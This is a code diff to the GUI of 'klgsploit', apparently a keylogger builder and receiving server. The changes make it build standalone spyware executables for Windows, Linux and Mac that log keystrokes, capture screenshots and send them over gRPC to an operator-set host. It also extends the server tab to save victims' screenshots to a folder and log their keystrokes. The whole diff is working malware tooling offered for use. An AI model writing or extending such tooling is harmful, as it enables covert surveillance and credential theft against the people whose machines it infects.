@@ -26,6 +26,8 @@ from klgsploit_cli import (
     SCRIPT_WIN_STANDARD, SCRIPT_WIN_ADVANCED_TEMPLATE,
     SCRIPT_LNX_STANDARD, SCRIPT_LNX_ADVANCED_TEMPLATE,
     SCRIPT_MAC_STANDARD, SCRIPT_MAC_ADVANCED_TEMPLATE,
+    STANDALONE_WIN_ADVANCED_TEMPLATE, STANDALONE_LNX_ADVANCED_TEMPLATE,
+    STANDALONE_MAC_ADVANCED_TEMPLATE,
     loggerFunctionWindows, loggerFunctionLinux, loggerFunctionMac,
     global_screencapture, KeylogServer, send_key
 )
@@ -478,18 +480,21 @@ class KlgsploitGUI:
         screenshot_interval = int(self.adv_screenshot_interval.get())
         
         self.adv_build_log.delete(1.0, tk.END)
-        self.adv_build_log.insert(tk.END, f"[*] Building advanced executable for {platform}...\n")
-        self.adv_build_log.insert(tk.END, f"    gRPC: {host}:{port}\n")
+        self.adv_build_log.insert(tk.END, f"[*] Building advanced standalone EXE for {platform}...\n")
+        self.adv_build_log.insert(tk.END, f"    gRPC Server: {host}:{port}\n")
         self.adv_build_log.insert(tk.END, f"    Screenshot interval: {screenshot_interval}s\n")
-        self.status_var.set("Building advanced...")
+        self.adv_build_log.insert(tk.END, f"    Mode: Standalone (no libs required)\n")
+        self.adv_build_log.insert(tk.END, f"    Features: Keylogging + Screenshot capture + gRPC exfiltration\n")
+        self.status_var.set("Building advanced standalone...")
         
         def build_thread():
+            # Use standalone templates for self-contained EXE builds
             if platform == 'win':
-                script = SCRIPT_WIN_ADVANCED_TEMPLATE.format(host=host, port=port, screenshot_interval=screenshot_interval)
+                script = STANDALONE_WIN_ADVANCED_TEMPLATE.format(host=host, port=port, screenshot_interval=screenshot_interval)
             elif platform == 'lnx':
-                script = SCRIPT_LNX_ADVANCED_TEMPLATE.format(host=host, port=port, screenshot_interval=screenshot_interval)
+                script = STANDALONE_LNX_ADVANCED_TEMPLATE.format(host=host, port=port, screenshot_interval=screenshot_interval)
             elif platform == 'mac':
-                script = SCRIPT_MAC_ADVANCED_TEMPLATE.format(host=host, port=port, screenshot_interval=screenshot_interval)
+                script = STANDALONE_MAC_ADVANCED_TEMPLATE.format(host=host, port=port, screenshot_interval=screenshot_interval)
             else:
                 self.adv_build_log.insert(tk.END, f"[!] Unsupported platform: {platform}\n")
                 return
@@ -507,6 +512,7 @@ class KlgsploitGUI:
             
             if result:
                 self.adv_build_log.insert(tk.END, f"[+] Build successful: {output_dir}/{filename}.{ext}\n")
+                self.adv_build_log.insert(tk.END, f"[+] Screenshots will be sent to {host}:{port}\n")
                 self.status_var.set("Advanced build completed!")
             else:
                 self.adv_build_log.insert(tk.END, "[!] Build failed.\n")
@@ -688,7 +694,7 @@ The merged executable will:
     # TAB 5: gRPC SERVER
     # ============================================
     def setup_server_tab(self):
-        frame = ttk.Labelframe(self.tab_server, text="gRPC Keylog Server", padding=20)
+        frame = ttk.Labelframe(self.tab_server, text="gRPC Keylog & Screenshot Server", padding=20)
         frame.pack(fill=BOTH, expand=True, padx=20, pady=20)
         
         # Host/Port config
@@ -702,6 +708,15 @@ The merged executable will:
         ttk.Label(config_frame, text="Port:").pack(side=LEFT, padx=5)
         self.server_port = tk.StringVar(value="50051")
         ttk.Entry(config_frame, textvariable=self.server_port, width=10).pack(side=LEFT, padx=5)
+        
+        # Screenshot save folder
+        screenshot_frame = ttk.Frame(frame)
+        screenshot_frame.pack(pady=10, fill=X)
+        
+        ttk.Label(screenshot_frame, text="Screenshots Folder:").pack(side=LEFT, padx=5)
+        self.server_screenshots_dir = tk.StringVar(value="./received_screenshots")
+        ttk.Entry(screenshot_frame, textvariable=self.server_screenshots_dir, width=40).pack(side=LEFT, padx=5)
+        ttk.Button(screenshot_frame, text="Browse", command=lambda: self.browse_dir(self.server_screenshots_dir)).pack(side=LEFT, padx=5)
         
         btn_frame = ttk.Frame(frame)
         btn_frame.pack(pady=10)
@@ -720,21 +735,36 @@ The merged executable will:
     def start_server(self):
         host = self.server_host.get()
         port = int(self.server_port.get())
+        screenshots_dir = self.server_screenshots_dir.get()
         
         self.server_log.delete(1.0, tk.END)
         self.server_log.insert(tk.END, f"[*] Starting gRPC server on {host}:{port}...\n")
+        self.server_log.insert(tk.END, f"[*] Screenshots will be saved to: {screenshots_dir}\n")
         self.status_var.set(f"Server running on {host}:{port}")
+        
+        # Custom callbacks to log to GUI
+        def on_keylog(message):
+            self.server_log.insert(tk.END, f"[KEYLOG] {message}\n")
+            self.server_log.see(tk.END)
+        
+        def on_screenshot(filepath, client_id, timestamp):
+            self.server_log.insert(tk.END, f"[SCREENSHOT] Saved: {filepath} from {client_id}\n")
+            self.server_log.see(tk.END)
         
         def run_server():
             try:
-                server = KeylogServer()
+                server = KeylogServer(
+                    screenshots_folder=screenshots_dir,
+                    keylog_callback=on_keylog,
+                    screenshot_callback=on_screenshot
+                )
                 server.serve(host=host, port=port)
             except Exception as e:
                 self.server_log.insert(tk.END, f"[!] Server error: {e}\n")
         
         self.server_thread = threading.Thread(target=run_server, daemon=True)
         self.server_thread.start()
-        self.server_log.insert(tk.END, "[+] Server started.\n")
+        self.server_log.insert(tk.END, "[+] Server started. Waiting for connections...\n")
     
     def stop_server(self):
         self.server_log.insert(tk.END, "[*] Server stop requested (restart app to fully stop).\n")
